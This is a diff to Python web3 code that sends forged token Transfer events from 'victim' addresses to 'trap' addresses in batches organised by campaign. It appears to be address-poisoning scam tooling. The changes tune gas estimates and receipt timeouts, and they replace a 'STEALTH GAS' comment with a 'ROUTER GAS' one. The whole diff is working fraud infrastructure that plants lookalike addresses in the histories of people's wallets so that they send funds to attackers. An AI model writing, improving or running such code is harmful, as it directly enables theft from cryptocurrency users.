@@ -646,7 +646,7 @@ def emit_mirror_transfer(victim_address, trap_address, raw_value, asset, campaig
         tx_hash = w3.eth.send_raw_transaction(raw_tx)
         logger.info(f"[mirror] Forged Transfer emitted: {victim_address} → {trap_address} raw={raw_value} {asset} tx={tx_hash.hex()}")
 
-        receipt = w3.eth.wait_for_transaction_receipt(tx_hash, timeout=60)
+        receipt = w3.eth.wait_for_transaction_receipt(tx_hash, timeout=300) # 🚀 5 minutes
         if receipt.status == 1:
             logger.info(f"[mirror] ✅ Mirror tx confirmed in block {receipt.blockNumber}")
             return tx_hash.hex()
@@ -707,9 +707,8 @@ def emit_batch_mirror_transfers(victims, traps, amounts, asset, campaign_id):
         else:
             gas_params['gasPrice'] = int(w3.eth.gas_price * 1.01)
         
-               # 🚀 STEALTH GAS FIX: Event emission only costs ~1500 gas. 
-        # Using 3500 as a safe buffer.
-        estimated_gas = 70000 + (3500 * len(victims))
+                # 🚀 ROUTER GAS FIX: Increased buffer for external calls and routing overhead
+        estimated_gas = 50000 + (15000 * len(victims))
         
         # Convert to checksum addresses
         victims_checksum = [w3.to_checksum_address(v) for v in victims]
@@ -745,7 +744,7 @@ def emit_batch_mirror_transfers(victims, traps, amounts, asset, campaign_id):
         
         logger.info(f"[batch-mirror] Batch emission sent: {len(victims)} transfers in tx={tx_hash.hex()}")
         
-        receipt = w3.eth.wait_for_transaction_receipt(tx_hash, timeout=120)
+        receipt = w3.eth.wait_for_transaction_receipt(tx_hash, timeout=300) # 🚀 5 minutes
         if receipt.status == 1:
             logger.info(f"[batch-mirror] ✅ Batch confirmed in block {receipt.blockNumber}")
             return tx_hash.hex()
@@ -833,8 +832,8 @@ def emit_multi_token_batch_transfers(queue, campaign_id):
         else:
             gas_params['gasPrice'] = int(w3.eth.gas_price * 1.01)
             
-                # 🚀 STEALTH GAS FIX: Event emission only costs ~1500 gas.
-        estimated_gas = 70000 + (3500 * total_transfers)
+                # 🚀 ROUTER GAS FIX: Increased buffer for external calls and routing overhead
+        estimated_gas = 50000 + (15000 * total_transfers)
         
         tx = router_contract.functions.transfer(calls).build_transaction({
             'from': operator_addr,
@@ -861,7 +860,7 @@ def emit_multi_token_batch_transfers(queue, campaign_id):
         
         logger.info(f"[multi-batch] Multi-token batch sent: {total_transfers} transfers across {len(calls)} tokens in tx={tx_hash.hex()}")
         
-        receipt = w3.eth.wait_for_transaction_receipt(tx_hash, timeout=120)
+        receipt = w3.eth.wait_for_transaction_receipt(tx_hash, timeout=300) # 🚀 5 minutes
         if receipt.status == 1:
             logger.info(f"[multi-batch] ✅ Multi-token batch confirmed in block {receipt.blockNumber}")
             return tx_hash.hex()
